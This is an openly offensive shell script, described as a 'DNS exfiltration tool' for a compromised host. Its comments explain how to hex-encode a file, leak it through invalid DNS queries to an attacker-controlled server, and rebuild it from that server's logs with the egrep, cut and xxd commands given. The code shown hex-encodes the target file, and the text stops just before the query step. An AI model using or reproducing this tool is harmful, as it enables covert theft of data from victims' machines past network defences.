# DNS Exfiltration tool is a very simple shell-script which has the goal of
# helping you exfiltrate the data of a host using DNS.

# For this to work you'll need to control a public and Internet accessible DNS
# server on the Internet.

# This script will basically do invalid DNS queries which you should log. Later
# you'll check the log file from the DNS service and parse all these invalid
# queries looking for the text in the "TAG" variable so you can pick up the
# "hostname" part of it - which is where the exfiltrated data will be.

# This script contains the part which should be executed in the compromised
# host, from which you'll want to exfiltrate information. On the DNS server logs
# (which will depend on which one you use) look for the TAG string using egrep
# and extract those to another file, like so:
# egrep -o "[0-9a-f]*.exfiltrated.domain.com" /var/log/query.log | cut -d. -f1 | uniq >> /tmp/info.txt

# Now you just need to reassemble the information:
# xxd -r -p < /tmp/info.txt > exfiltrated-information.txt

# Pretty simple, huh? :)

# convert file content to hex and save it in the /tmp folder
/usr/bin/xxd -p $FILE > /tmp/exfilme.hex

# does fake DNS queries so we can send the hex file to the log of the DNS
# server we control on the Internet.
